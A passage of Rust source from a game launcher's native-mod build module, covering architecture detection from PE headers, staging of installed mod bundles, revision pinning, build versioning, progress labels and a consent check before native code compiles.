//! Native mods compile against the pinned prebuilt game with the managed Rust toolchain.
//! Function-replacement mixins copy target functions from pinned source into a patch library.
//! Native code runs with the player's rights and is not sandboxed.
use crate::backend;
use crate::i18n::{tr, trf};
use crate::instances::{self, Instance};
use crate::rust_toolchain;
use sha2::{Digest, Sha256};
use std::fs;
use std::io::{Read, Seek, SeekFrom};
use std::path::{Path, PathBuf};

use sunrise_launcher_smod::dependencies;

mod build_log;
mod bundle;
use build_log::log_warning;
pub(crate) use build_log::root;
pub use build_log::{
    append_log, check_cancelled, clear_log, compiling as compiling_mod, failure, log_path, Refusal,
    CANCELLED,
};
use bundle::{bundle_files, is_revision};
pub use bundle::{
    bundle_in, bundles, copy_bundle, digest, scan_bundles, source_digest, Bundle, Target,
    MIXINS_REV, NATIVE_MANIFEST,
};
mod planning;
pub use planning::{routes, update_check, UpdateCheck};
mod internals_sync;
mod tool;
pub use internals_sync::catalog;
pub mod fit;
mod isolate;
mod picker;
pub mod sdk_cache;

pub use isolate::{LeftOut, Why};
pub use picker::{Route, Routes};
pub use tool::Consent;
mod uses;

// Settings and logs are shared by native-build and diagnostics tests.
#[cfg(test)]
pub(crate) static TEST_STATE: std::sync::Mutex<()> = std::sync::Mutex::new(());

const PREFIX: &str = "native-";
// A staging change invalidates both installed builds and patched-source snapshots.
const STAGING: &str = "area-aware-mixins-input-v1";

/// Native mods use the SDK's optimized compilation settings.
#[derive(
    Clone,
    Copy,
    Debug,
    Default,
    PartialEq,
    Eq,
    serde::Serialize,
    serde::Deserialize,
    clap::ValueEnum,
)]
#[serde(rename_all = "kebab-case")]
pub enum Profile {
    #[default]
    Optimized,
}
impl Profile {
    pub fn name(self) -> &'static str {
        "optimized"
    }
    fn cargo(self) -> (&'static str, &'static [&'static str]) {
        ("release", &[])
    }
}

/// Where the launcher installs what a [`Target`] builds.
trait Installed {
    fn directory(self, version: &str) -> PathBuf;
    fn binary(self) -> String;
}

impl Installed for Target {
    fn directory(self, version: &str) -> PathBuf {
        match self {
            Self::Client => backend::version_dir(version),
            Self::Server => root().join("server-builds").join(version),
        }
    }

    /// The name the built binary is installed under: the game's own, the engine's
    /// (`sunrise-engine`, docs/server.md).
    fn binary(self) -> String {
        match self {
            Self::Client => backend::CLIENT.into(),
            Self::Server => format!("sunrise-engine{}", std::env::consts::EXE_SUFFIX),
        }
    }
}

/// The platform the game's source will be compiled for. On Windows this follows the installed
/// game's executable, not the PC's native architecture; the launcher must have a matching managed
/// host toolchain before any compilation starts.
#[derive(Clone, Copy, Debug, Default, PartialEq, Eq)]
struct BuildPlatform {
    target: Option<&'static str>,
    machine: Option<u16>,
}

impl BuildPlatform {
    fn cache_key(self) -> Option<&'static str> {
        match self.target {
            // Rebuild rather than reuse a build published without its GNU runtime libraries.
            Some(rust_toolchain::WINDOWS_X64_TARGET) => Some("windows-x64-gnu-runtime-v1"),
            target => target,
        }
    }
}

fn platform_for_game(base: &str) -> Result<BuildPlatform, String> {
    if std::env::consts::OS != "windows" {
        return Ok(BuildPlatform::default());
    }
    let executable = backend::version_dir(base).join(backend::CLIENT);
    let machine = pe_machine(&executable).map_err(|error| {
        trf(
            "Could not read {name}: {error}",
            &[
                ("name", &executable.display().to_string()),
                ("error", &error),
            ],
        )
    })?;
    let selected_target = rust_toolchain::windows_target_for_machine(machine).ok_or_else(|| {
        architecture_mismatch(&format!("PE machine 0x{machine:04x}"), "x64 or ARM64")
    })?;
    let Some(host) = rust_toolchain::host() else {
        return Err(architecture_mismatch(
            windows_architecture(selected_target),
            std::env::consts::ARCH,
        ));
    };
    windows_build_platform(machine, host.target)
}

fn windows_build_platform(machine: u16, host_target: &str) -> Result<BuildPlatform, String> {
    let target = rust_toolchain::windows_target_for_machine(machine).ok_or_else(|| {
        architecture_mismatch(&format!("PE machine 0x{machine:04x}"), "x64 or ARM64")
    })?;
    if rust_toolchain::windows_target_for_host(host_target, machine).is_none() {
        return Err(architecture_mismatch(
            windows_architecture(target),
            windows_architecture(host_target),
        ));
    }
    Ok(BuildPlatform {
        target: Some(target),
        machine: Some(machine),
    })
}

fn architecture_mismatch(game: &str, toolchain: &str) -> String {
    trf(
        "Native mods require supported Windows architectures that match. Game: {game_arch}; build toolchain: {toolchain_arch}.",
        &[("game_arch", game), ("toolchain_arch", toolchain)],
    )
}

fn windows_architecture(target: &str) -> &'static str {
    match target {
        rust_toolchain::WINDOWS_X64_TARGET => "x64",
        rust_toolchain::WINDOWS_ARM64_TARGET => "ARM64",
        _ => unreachable!(),
    }
}

/// Reads the COFF machine from a Windows PE executable after validating its two signatures.
pub(crate) fn pe_machine(path: &Path) -> Result<u16, String> {
    let mut file = fs::File::open(path).map_err(|error| error.to_string())?;
    let mut dos = [0; 64];
    file.read_exact(&mut dos)
        .map_err(|error| error.to_string())?;
    if &dos[..2] != b"MZ" {
        return Err("missing DOS MZ signature".into());
    }
    let pe_offset = u32::from_le_bytes(dos[0x3c..0x40].try_into().unwrap()) as u64;
    file.seek(SeekFrom::Start(pe_offset))
        .map_err(|error| error.to_string())?;
    let mut header = [0; 6];
    file.read_exact(&mut header)
        .map_err(|error| error.to_string())?;
    if &header[..4] != b"PE\0\0" {
        return Err("missing PE signature".into());
    }
    Ok(u16::from_le_bytes([header[4], header[5]]))
}

/// What a native build was made from, kept per profile in `native/built.json` after it compiled:
/// what the next build is compared with to say what changed.
/// What a build is going to do, said before it starts.
#[derive(Clone, Debug, PartialEq, Eq)]
pub enum Plan {
    /// The build already exists: nothing compiles.
    UpToDate,
    /// The mods compile against the prebuilt game (#589); the game doesn't compile.
    Prebuilt,
}

impl Plan {
    pub fn label(&self) -> String {
        match self {
            Self::UpToDate => tr("Up to date (no build needed)").into(),
            Self::Prebuilt => tr("Prebuilt game: only the mods compile").into(),
        }
    }
}

/// Whether an installed version is a native-mods build.
pub fn is_native(version: &str) -> bool {
    version.starts_with(PREFIX)
}

/// Records the whole attempt, including selection or export after compilation.
fn logged<T, E: std::fmt::Display + From<String>>(
    build: impl FnOnce(Result<&crate::native_cache::Cache, &str>) -> Result<T, E>,
) -> Result<T, E> {
    // Another build or a cleanup holds the lease on the same target/: refuse. Any other
    // failure only stops cleanup for explicit builds. Automatic selection requires a held
    // cache for its catalog and can refuse instead of accessing an unsafe tree.
    let cache = match crate::native_cache::Cache::acquire(&backend::build_dir()) {
        Ok(cache) => Ok(cache),
        Err(crate::native_cache::Error::Busy) => {
            return Err(cache_error(crate::native_cache::Error::Busy).into());
        }
        Err(error) => Err(cache_error(error)),
    };
    clear_log()?;
    if let Err(warning) = &cache {
        log_warning(warning);
    }
    let result = build(cache.as_ref().map_err(String::as_str));
    // Keep this build lease through installation/export, including failed builds. It does not
    // exclude independent game starts; automatic trimming can conservatively retain the cache.
    if let Ok(cache) = cache {
        crate::storage::eviction::after_build_logged(&cache, append_log, log_warning);
    }
    match &result {
        Ok(_) => {
            let _ = append_log("Build completed.");
        }
        Err(error) => {
            let _ = append_log(&format!("The build failed: {error}"));
        }
    }
    result
}

/// `native-build --mixins-from-source`: the build tool builds horizon-mixins from its pinned source.
static MIXINS_FROM_SOURCE: std::sync::atomic::AtomicBool =
    std::sync::atomic::AtomicBool::new(false);

/// Builds horizon-mixins from its pinned source instead of downloading its release, so CI keeps that path proven.
pub fn mixins_from_source(on: bool) {
    MIXINS_FROM_SOURCE.store(on, std::sync::atomic::Ordering::Relaxed);
}

/// Stops the native build running: its tool and every compiler that started.
pub fn cancel() {
    build_log::cancel();
    tool::stop();
}

/// The failed build's error, led by its blamed mod in the launcher's own words, as [`compile_failed_mod`] and [`refused_mod`] read it.
fn blamed_text(failed: tool::Failure) -> String {
    let lead = match failed.blame {
        None => {
            return trf(
                "The native build failed: {error}",
                &[("error", &failed.error)],
            )
        }
        Some(tool::Blame {
            mod_id,
            kind: tool::BlameKind::Compile,
        }) => failure(&compiling_mod(&mod_id), tr("see the build log"), &[], &[]),
        Some(tool::Blame {
            mod_id,
            kind: tool::BlameKind::BuildScript,
        }) => Refusal::BuildScript { mod_id }.to_string(),
        Some(tool::Blame {
            mod_id,
            kind: tool::BlameKind::Features,
        }) => Refusal::Features { mod_id }.to_string(),
    };
    format!("{lead}\n\n{}", failed.error)
}

pub fn sync_internals(folder: &Path) -> Result<serde_json::Value, Failed> {
    require_consent()?;
    internals_sync::check(folder).map_err(Failed::Other)
}

pub fn cache_error(error: crate::storage::Error) -> String {
    match error {
        crate::native_cache::Error::Busy => {
            tr("A native build or cache cleanup is running. Try again when it finishes.").into()
        }
        crate::native_cache::Error::IncompleteUnit => tr("Native compilation outputs were kept because their executable completeness cannot be proven.").into(),
        crate::native_cache::Error::UnprovenExclusion => tr(
            "An older game build can use this cache without runtime leases.",
        )
        .into(),
        crate::native_cache::Error::UnsupportedFilesystem => {
            tr("Game cache leases require a supported local filesystem.").into()
        }
        crate::native_cache::Error::Unsafe(path) => trf(
            "Refusing native cache cleanup at an unexpected file or link: {path}",
            &[("path", &path.display().to_string())],
        ),
        crate::native_cache::Error::Io(error) => trf(
            "Could not access the native build cache: {error}",
            &[("error", &error.to_string())],
        ),
    }
}

/// Where an instance keeps the native mods installed from the registry, `<id>.smod`, each on or
/// off in `sunrise-mods.txt` like any mod.
pub const INSTALLED: &str = sunrise_launcher_smod::mod_list::NATIVE_DIR;

/// The native mods turned on in the game folder `home`, unpacked into a folder [`build`] takes.
/// Each flat `.smod` passes the registry's shared package boundary; no code is run.
pub fn installed_mods(home: &Path) -> Result<PathBuf, String> {
    stage_installed(home, root().join("installed.incoming"))?.ok_or_else(|| {
        format!(
            "No native mod is turned on in {}: install one from the Mods page first.",
            home.join(INSTALLED).display()
        )
    })
}

/// [`installed_mods`] into `out`, which it empties first.
pub(crate) fn stage_installed(home: &Path, out: PathBuf) -> Result<Option<PathBuf>, String> {
    let _ = fs::remove_dir_all(&out);
    let mut paths: Vec<PathBuf> = fs::read_dir(home.join(INSTALLED))
        .map(|dir| dir.flatten().map(|e| e.path()).collect())
        .unwrap_or_default();
    paths.retain(|p| p.extension().is_some_and(|e| e == "smod"));
    paths.sort();
    let mut count = 0;
    for path in paths {
        let bundle = sunrise_launcher_smod::index::native::Bundle::read(&path)
            .map_err(|e| format!("{}: {e}", path.display()))?;
        if !crate::browser::java::is_enabled(home, &bundle.manifest.id) {
            continue;
        }
        let dir = out.join(&bundle.manifest.id);
        for (name, bytes) in &bundle.files {
            let to = dir.join(name);
            fs::create_dir_all(to.parent().unwrap_or(&dir)).map_err(|e| e.to_string())?;
            fs::write(&to, bytes).map_err(|e| format!("{}: {e}", to.display()))?;
        }
        count += 1;
    }
    for bundle in crate::native_status::wasm_points(home) {
        let dir = out.join(&bundle.manifest.id);
        for (name, bytes) in &bundle.files {
            let to = dir.join(name);
            fs::create_dir_all(to.parent().unwrap_or(&dir)).map_err(|e| e.to_string())?;
            fs::write(&to, bytes).map_err(|e| e.to_string())?;
        }
        count += 1;
    }
    if count == 0 {
        return Err(format!(
            "No native mod is turned on in {}: install one from the Mods page first.",
            home.join(INSTALLED).display()
        ));
    }
    fs::create_dir_all(&out).map_err(|e| e.to_string())?;
    Ok(Some(out))
}

/// Generate only registry pins; never compiles source or modifies manifests.
pub fn registry_lock(folder: &Path, update: bool) -> Result<(), String> {
    if bundles(folder)?.len() != 1 {
        return Err("native-lock requires one mod folder".into());
    }
    fs::create_dir_all(root()).map_err(|e| e.to_string())?;
    internals_sync::lock(folder, update)
}

/// The native build tool for the mod in `folder`: a debug launcher's developer tool ([`sdk_cache::developer_tool`]), else the one its pinned build's SDK carries.
fn tool_for(folder: &Path) -> Result<PathBuf, String> {
    if let Some(program) = sdk_cache::developer_tool(false) {
        return Ok(program);
    }
    let bundle = bundle_in(folder)?.ok_or_else(|| {
        trf(
            "{path} is not a native mod project.",
            &[("path", &folder.display().to_string())],
        )
    })?;
    let base = sdk_cache::Base::from_env();
    let keys = sunrise_launcher_release_verify::sdk_keys_for(backend::REPO);
    let sdk = sdk_cache::index(&base, &bundle.native().sunrise, &keys).map_err(refused)?;
    sdk_cache::tool(&sdk, &base, &|_| {}).map_err(refused)
}

/// The one value the bundles pin for `which` (each mod's `get`), else `fallback`; mods that pin
/// different ones can't be built together, and the error says which.
fn agreed(
    bundles: &[Bundle],
    which: &str,
    get: impl Fn(&Bundle) -> Option<&String>,
    fallback: impl FnOnce() -> Result<String, String>,
) -> Result<String, String> {
    let mut pins: Vec<(&String, &str)> = bundles
        .iter()
        .filter_map(|b| get(b).map(|r| (r, b.manifest.id.as_str())))
        .collect();
    pins.sort();
    let revision = match pins.first() {
        None => fallback()?,
        Some((first, _)) if pins.iter().all(|(r, _)| r == first) => (*first).clone(),
        Some(_) => {
            let list: Vec<String> = pins
                .iter()
                .map(|(r, id)| format!("{id} → {}", &r[..r.len().min(7)]))
                .collect();
            return Err(format!(
                "These mods were made for different {which} revisions and can't be built together: {}. Install versions made for the same Nightly.",
                list.join(", ")
            ));
        }
    };
    if !is_revision(&revision) {
        return Err(format!(
            "{revision} is not a {which} commit (40 hex digits)."
        ));
    }
    Ok(revision)
}

/// The revision `bundles` build on for `which` when their pins differ: the newest of the pins and
/// `also` (the launcher's own horizon-mixins), by its commit's time (`date`), so no mod gets an
/// older one than it was made for. With one pin or none, it is [`agreed`]'s.
fn newest(
    bundles: &[Bundle],
    which: &str,
    get: impl Fn(&Bundle) -> Option<&String>,
    fallback: impl FnOnce() -> Result<String, String>,
    also: Option<&str>,
    date: impl Fn(&str) -> Result<String, String>,
) -> Result<String, String> {
    let mut pins: Vec<&str> = bundles
        .iter()
        .filter_map(|b| get(b).map(String::as_str))
        .collect();
    pins.sort();
    pins.dedup();
    if pins.len() < 2 {
        return agreed(bundles, which, get, fallback);
    }
    if let Some(bad) = pins.iter().find(|p| !is_revision(p)) {
        return Err(format!("{bad} is not a {which} commit (40 hex digits)."));
    }
    pins.extend(also.filter(|a| !pins.contains(a)));
    let mut dated = Vec::new();
    for pin in pins {
        let when = date(pin).map_err(|e| {
            format!("Can't tell which of the mods' {which} revisions is newest: {e}")
        })?;
        dated.push((when, pin));
    }
    Ok(dated
        .into_iter()
        .max()
        .map(|(_, p)| p.to_owned())
        .unwrap_or_default())
}

/// When commit `revision` of GitHub's `repo` was made (ISO 8601, so it sorts), from the dates kept
/// in [`DATES`] when it was asked before: a commit's date never changes, so a build of mods made
/// for different revisions can be used again offline or past GitHub's rate limit.
fn committed(repo: &str, revision: &str) -> Result<String, String> {
    remembered(&root().join(DATES), repo, revision, ask_github)
}

/// The file in [`root`] keeping the commit dates GitHub gave, as `{"repo@revision": date}`.
const DATES: &str = "commit-dates.json";

/// The date `file` keeps for `repo`'s `revision`, else `ask`'s, then kept in `file`.
fn remembered(
    file: &Path,
    repo: &str,
    revision: &str,
    ask: impl FnOnce(&str, &str) -> Result<String, String>,
) -> Result<String, String> {
    let key = format!("{repo}@{revision}");
    let mut dates: serde_json::Map<String, serde_json::Value> = fs::read(file)
        .ok()
        .and_then(|b| serde_json::from_slice(&b).ok())
        .unwrap_or_default();
    if let Some(date) = dates.get(&key).and_then(|d| d.as_str()) {
        return Ok(date.to_owned());
    }
    let date = ask(repo, revision)?;
    dates.insert(key, date.clone().into());
    if let Ok(text) = serde_json::to_vec_pretty(&dates) {
        let _ = fs::write(file, text);
    }
    Ok(date)
}

fn ask_github(repo: &str, revision: &str) -> Result<String, String> {
    let url = format!("https://api.github.com/repos/{repo}/commits/{revision}");
    let commit = crate::github::json(&url)?;
    commit["commit"]["committer"]["date"]
        .as_str()
        .map(str::to_owned)
        .ok_or_else(|| format!("GitHub doesn't know {repo} commit {revision}."))
}

/// How [`build`] starts its error when mods pin another Sunrise revision.
pub const MISMATCH: &str = "Made for other Sunrise versions: ";

/// Each pinned mod whose Sunrise revision isn't `revision`, as `id → pin`, and the build's.
fn mismatch(mods: &[Bundle], revision: &str) -> Option<String> {
    let list: Vec<String> = mods
        .iter()
        .map(|b| (b, &b.native().sunrise))
        .filter(|(_, r)| *r != revision)
        .map(|(b, r)| format!("{} → {}", b.manifest.id, &r[..r.len().min(7)]))
        .collect();
    (!list.is_empty()).then(|| {
        format!(
            "{}; the build uses {}",
            list.join(", "),
            &revision[..revision.len().min(7)]
        )
    })
}

fn build_revision(base: &str, built_on: Option<&About>) -> Result<String, String> {
    built_on.map_or_else(|| revision_of(base), |about| Ok(about.sunrise.clone()))
}

fn mismatch_error(list: &str) -> String {
    format!("{MISMATCH}{list}; rebuild against this game.")
}

/// The build id (the Sunrise commit) `version` (an installed release or Nightly) was built from:
/// a developer install's checkout, else what the release's signed copy of its SDK's index names
/// ([`sdk_cache::build_of`]).
pub fn revision_of(version: &str) -> Result<String, String> {
    if crate::developer_install::is_developer(version) {
        return crate::developer_install::revision(version);
    }
    sdk_cache::build_of(
        version,
        &sdk_cache::Base::from_env(),
        &sunrise_launcher_release_verify::sdk_keys_for(backend::REPO),
    )
    .map_err(|refusal| refusal.to_string())
}

/// What a native build was made from: its `native-mods.json`.
#[derive(Clone, Debug, PartialEq)]
pub struct About {
    /// The release or Nightly it started from.
    pub base: String,
    /// The Sunrise commit it compiled.
    pub sunrise: String,
    /// What it compiles: the game or the headless engine a server runs.
    pub target: Target,
    /// The mods turned on that it was built without, and why.
    pub left_out: Vec<LeftOut>,
}

/// What installed native build `version` was made from; None for any other version.
pub fn about(version: &str) -> Option<About> {
    checked_about(version).ok().flatten()
}

fn checked_about(version: &str) -> Result<Option<About>, String> {
    if !is_native(version) {
        return Ok(None);
    }
    about_in(&backend::version_dir(version)).map(Some).ok_or_else(|| trf(
        "Native build {version} has a missing or invalid native-mods.json record. Rebuild it from an installed Sunrise version.",
        &[("version", version)],
    ))
}

/// The build record (`native-mods.json`) in version folder `dir`, if it parses.
fn about_in(dir: &Path) -> Option<About> {
    let json: serde_json::Value =
        serde_json::from_str(&fs::read_to_string(dir.join("native-mods.json")).ok()?).ok()?;
    let field = |name: &str| json[name].as_str().map(str::to_owned);
    Some(About {
        base: field("base")?,
        sunrise: field("sunrise").filter(|r| is_revision(r))?,
        target: match field("target").as_deref() {
            Some("server") => Target::Server,
            Some("client") => Target::Client,
            _ => return None,
        },
        left_out: json["left_out"]
            .as_array()
            .into_iter()
            .flatten()
            .filter_map(LeftOut::from_json)
            .collect(),
    })
}

/// The newest installed release or Nightly in `installed` (newest first).
/// Installed native clients retain their base's prepared data even when not selected.
pub(crate) fn resource_dependents(tag: &str) -> bool {
    backend::installed()
        .iter()
        .any(|version| about(version).is_some_and(|about| about.base == tag))
}

pub(crate) fn newest_installed(installed: &[String]) -> Option<&String> {
    installed
        .iter()
        .find(|t| backend::is_game_tag(t) || t.starts_with("nightly-"))
}

/// The installed version a build for an instance that plays `current` starts from: `current`
/// itself, so a rebuild stays on the Sunrise it plays (a native build's own revision, [`about`]).
/// With `update`, or when it plays nothing installed, the newest installed release or Nightly.
/// An imported build is no commit to build on: its game files' version is.
pub fn base_for(current: Option<&str>, installed: &[String], update: bool) -> Option<String> {
    let imported = current.and_then(crate::build_import::about).map(|a| a.base);
    match imported.as_deref().or(current) {
        Some(v) if !update && installed.iter().any(|t| t == v) => Some(v.to_owned()),
        _ => newest_installed(installed).cloned(),
    }
}

/// The newer Sunrise a build with `update` would move native build `version` to: the newest
/// installed release or Nightly, when it is newer than the one the build started from.
pub fn update_for(version: &str, installed: &[String]) -> Option<String> {
    newer_than(&about(version)?.base, installed)
}

pub fn newer_than(base: &str, installed: &[String]) -> Option<String> {
    newest_installed(installed)
        .filter(|n| *n != base && backend::compare_versions(n, base).is_gt())
        .cloned()
}

/// The installed version `bundles` built on Sunrise `revision` with horizon-mixins `mixins`
/// become: `native-<7 digits of the revision>-<12 hex digits>`. The two targets' keys never mix:
/// a server build salts its hash, so it is another version than the client build of the same
/// mods.
pub fn version_for(
    revision: &str,
    mixins: &str,
    profile: Profile,
    target: Target,
    platform: Option<&str>,
    bundles: &[Bundle],
) -> Result<String, String> {
    let mut hash = Sha256::new();
    let (cargo_profile, configs) = profile.cargo();
    for part in [STAGING, mixins, cargo_profile]
        .into_iter()
        .chain(configs.iter().copied())
        .chain([rust_toolchain::VERSION, revision])
        .chain(platform)
    {
        hash.update(part.as_bytes());
        hash.update([0]);
    }
    if target == Target::Server {
        hash.update(target.name().as_bytes());
        hash.update([0]);
    }
    // bundles() reads folders in path order, which with their manifests decides trait dispatch
    // order: hashed in that order, a different order is another build.
    for b in bundles {
        hash.update(b.manifest.id.as_bytes());
        hash.update([0]);
        for (name, path) in bundle_files(b)? {
            let bytes = fs::read(&path).map_err(|e| format!("{}: {e}", path.display()))?;
            hash.update(name.as_bytes());
            hash.update((bytes.len() as u64).to_le_bytes());
            hash.update(&bytes);
        }
    }
    let key: String = hash.finalize()[..6]
        .iter()
        .map(|b| format!("{b:02x}"))
        .collect();
    Ok(format!("{PREFIX}{}-{key}", &revision[..7]))
}

/// Where a build is.
#[derive(Clone, Debug, PartialEq)]
pub enum Step {
    Rust(f32),
    Tool,
    Source(String),
    Mixins,
    /// A previously patched source snapshot was reused.
    CachedMixins,
    /// Which case the build is, before anything runs.
    Plan(Plan, Profile),
    /// Crates done, the total once cargo says it, and the one just started.
    Compile {
        done: usize,
        total: Option<usize>,
        name: String,
        profile: Profile,
    },
    /// The mods' own crates checked against Sunrise's `Cargo.lock`.
    Crates,
    /// The mod tools (the SDK's slices) of a build are fetched: bytes done of the whole.
    Tools {
        build: String,
        done: u64,
        total: u64,
    },
    /// The mod tools of a build were all kept from an earlier build: nothing is downloaded.
    ToolsKept {
        build: String,
    },
    /// Each mod is checked against the build: how many.
    Checking(usize),
    /// A world was backed up before the mods saved in it were switched off: where.
    BackedUp(String),
    /// The mods compile against the prebuilt game.
    PrebuiltMods,
    /// One mod's own library starts compiling: which, and how far through the mods.
    Mod {
        id: String,
        done: usize,
        total: usize,
    },
    Install,
    /// This mod was left out of the build.
    LeftOut(LeftOut),
    /// The build ended: seconds it took.
    Done {
        secs: u64,
        profile: Profile,
        plan: Plan,
    },
}

/// The three stages a build passes through, as the Mods page's pills show them.
#[derive(Clone, Copy, Debug, PartialEq, Eq, PartialOrd, Ord)]
pub enum Stage {
    /// Tools, source and the prebuilt game fetched and made ready.
    Prepare,
    /// The game and the mods compile.
    Compile,
    /// The build is put in place for the instance.
    Install,
}

impl Stage {
    pub const ALL: [Self; 3] = [Self::Prepare, Self::Compile, Self::Install];

    pub fn label(self) -> &'static str {
        match self {
            Self::Prepare => tr("Prepare"),
            Self::Compile => tr("Build"),
            Self::Install => tr("Install"),
        }
    }
}

/// How far a build is: its stage, and how much of the whole when that is known.
#[derive(Clone, Copy, Debug, PartialEq)]
pub struct Progress {
    pub stage: Stage,
    /// 0 to 1 within the stage, when the step reports it.
    pub fraction: Option<f32>,
}

impl Step {
    pub fn progress(&self) -> Progress {
        let (stage, fraction) = match self {
            Self::Rust(done) => (Stage::Prepare, Some(*done)),
            Self::Tool
            | Self::Source(_)
            | Self::Mixins
            | Self::CachedMixins
            | Self::Plan(..)
            | Self::Crates
            | Self::LeftOut(_)
            | Self::Checking(_)
            | Self::BackedUp(_) => (Stage::Prepare, None),
            Self::ToolsKept { .. } => (Stage::Prepare, Some(1.)),
            Self::Tools { done, total, .. } => (
                Stage::Prepare,
                (*total > 0).then_some(*done as f32 / *total as f32),
            ),
            Self::Compile { done, total, .. } => (
                Stage::Compile,
                total.filter(|t| *t > 0).map(|t| *done as f32 / t as f32),
            ),
            Self::PrebuiltMods => (Stage::Compile, None),
            Self::Mod { done, total, .. } => (
                Stage::Compile,
                (*total > 0).then(|| done.saturating_sub(1) as f32 / *total as f32),
            ),
            Self::Install => (Stage::Install, None),
            Self::Done { .. } => (Stage::Install, Some(1.)),
        };
        Progress { stage, fraction }
    }

    pub fn label(&self) -> String {
        match self {
            Self::Rust(done) => trf(
                "Downloading Rust {version} (once): {done}%",
                &[
                    ("version", rust_toolchain::VERSION),
                    ("done", &format!("{:.0}", done * 100.0)),
                ],
            ),
            Self::Tool => tr("Building sunrise-mixins (once)").into(),
            Self::Source(revision) => trf(
                "Downloading Sunrise's source at {revision}",
                &[("revision", &revision[..7])],
            ),
            Self::Mixins => tr("Applying the mixins").into(),
            Self::CachedMixins => tr("Reusing patched game source").into(),
            Self::Crates => tr("Checking native dependency pins and the game graph").into(),
            Self::Tools { build, done, total } => trf(
                "Getting the mod tools for {build}: {done} of {total} MB",
                &[
                    ("build", build),
                    ("done", &(done / 1_000_000).to_string()),
                    ("total", &total.div_ceil(1_000_000).max(1).to_string()),
                ],
            ),
            Self::ToolsKept { build } => trf(
                "Using the mod tools for {build} kept from an earlier build",
                &[("build", build)],
            ),
            Self::BackedUp(said) => said.clone(),
            Self::Checking(count) => match count {
                1 => tr("Checking 1 mod").into(),
                count => trf("Checking {count} mods", &[("count", &count.to_string())]),
            },
            Self::PrebuiltMods => tr("Compiling the mods against the prebuilt game").into(),
            Self::Mod { id, done, total } => trf(
                "Compiling {mod} ({done} of {total})",
                &[
                    ("mod", id),
                    ("done", &done.to_string()),
                    ("total", &total.to_string()),
                ],
            ),
            Self::Plan(plan, profile) => format!("{} ({})", plan.label(), profile.name()),
            Self::Compile {
                done,
                total,
                name,
                profile,
            } => match total {
                Some(total) => trf(
                    "Compiling the game ({profile}): {done} of {total} crates, now {name}",
                    &[
                        ("profile", profile.name()),
                        ("done", &done.to_string()),
                        ("total", &total.to_string()),
                        ("name", name),
                    ],
                ),
                None => trf(
                    "Compiling the game ({profile}): {done} crates, now {name}",
                    &[
                        ("profile", profile.name()),
                        ("done", &done.to_string()),
                        ("name", name),
                    ],
                ),
            },
            Self::Install => tr("Installing the build").into(),
            Self::LeftOut(left) => left.label(),
            Self::Done { secs, .. } => trf(
                "Your mods are built (took {secs} s).",
                &[("secs", &secs.to_string())],
            ),
        }
    }

    /// The step as the window's build card says it, in a player's words: the compiler and the
    /// mod tools by what they are, the toolchain's own steps as getting ready. The command line
    /// and the log keep [`Self::label`].
    pub fn shown(&self) -> String {
        match self {
            Self::Rust(_) => tr("Downloading the compiler").into(),
            Self::Tool => tr("Getting the mod tools ready").into(),
            Self::Source(_) | Self::Crates | Self::Plan(..) => tr("Getting ready to build").into(),
            Self::Mixins | Self::CachedMixins | Self::PrebuiltMods => {
                tr("Preparing your mods").into()
            }
            Self::Tools { done, total, .. } => trf(
                "Downloading the mod tools: {done} of {total} MB",
                &[
                    ("done", &(done / 1_000_000).to_string()),
                    ("total", &total.div_ceil(1_000_000).max(1).to_string()),
                ],
            ),
            Self::ToolsKept { .. } => tr("Using the mod tools already downloaded").into(),
            Self::Compile { .. } => tr("Building the game with your mods").into(),
            Self::Mod { id, done, total } => trf(
                "Building {mod} ({done} of {total})",
                &[
                    ("mod", id),
                    ("done", &done.to_string()),
                    ("total", &total.to_string()),
                ],
            ),
            _ => self.label(),
        }
    }
}

/// The mod among `ids` whose own compile `error` reports ([`failure`] led by [`compiling_mod`]).
pub fn compile_failed_mod<'a>(error: &str, ids: &'a [String]) -> Option<&'a String> {
    ids.iter()
        .find(|id| error.contains(&format!("{} (", build_log::failed(&compiling_mod(id)))))
}

/// The mod among `ids` whose build script or features stopped the build `error` describes, and
/// why: `error` holds that refusal word for word (the build log keeps it).
pub fn refused_mod<'a>(error: &str, ids: &'a [String]) -> Option<(&'a String, Refusal)> {
    ids.iter().find_map(|id| {
        [
            Refusal::BuildScript { mod_id: id.clone() },
            Refusal::Features { mod_id: id.clone() },
        ]
        .into_iter()
        .find(|refusal| error.contains(&refusal.to_string()))
        .map(|refusal| (id, refusal))
    })
}

/// What a build of `folder`'s mods came out as: the version it installed and what it did.
#[derive(Clone, Debug)]
struct Built {
    version: String,
    /// Which case the build was, said before anything ran.
    plan: Plan,
    /// The profile it compiled with.
    profile: Profile,
    /// How long the whole build took.
    secs: u64,
    /// The mods turned on that it was built without.
    left_out: Vec<LeftOut>,
}

/// Why a native build or internals check stopped.
#[derive(Debug)]
pub enum Failed {
    /// No native-code permission has been recorded for this install.
    NoConsent,
    /// These mods stopped it (`error` says how), while `compiling` or before: it can run again
    /// without them.
    Mods {
        left: Vec<LeftOut>,
        error: String,
        compiling: bool,
    },
    /// Every mod was left out.
    Nothing,
    /// Mods this build can't use were saved into worlds: the player chooses (stay, or back the
    /// worlds up and build without them).
    Worlds(Box<AtStake>),
    Other(String),
}

impl From<String> for Failed {
    fn from(error: String) -> Self {
        Self::Other(error)
    }
}

impl std::fmt::Display for Failed {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::Mods { error, .. } | Self::Other(error) => f.write_str(error),
            Self::Worlds(stake) => f.write_str(&stake.text),
            Self::Nothing => Ok(()),
            Self::NoConsent => f.write_str(tr("Native mods run inside your game with your rights; mixins compile code into the game. Allow native mods in Settings, Storage, or pass --trust-native-code.")),
        }
    }
}
impl std::error::Error for Failed {}
impl From<Failed> for String {
    fn from(failed: Failed) -> Self {
        failed.to_string()
    }
}

/// Refuse before staging, fetching a prebuilt game or downloading a compiler.
pub fn require_consent() -> Result<(), Failed> {
    if backend::Settings::load().native_mods_allowed_at.is_some() {
        Ok(())
    } else {
        Err(Failed::NoConsent)
    }
}

/// Isolation and jar-download choices for an explicit build.
#[derive(Default)]
struct BuildOptions<'a> {
    allow_jar_downloads: bool,
    skip: &'a [LeftOut],
    registry_consent: Option<&'a dyn Fn(&Consent) -> bool>,
    /// The game folder whose worlds a mod switched off for this build must not be lost from:
    /// the instance's ([`guard_worlds`]).
    worlds: Option<&'a Path>,
    /// The player chose to back up the worlds saved with mods this build switches off, then
    /// build without them.
    back_up: bool,
}

/// Mods saved into worlds that a build would switch off ([`Failed::Worlds`]): what the player
/// reads, and what the choice is between.
#[derive(Clone, Debug, PartialEq)]
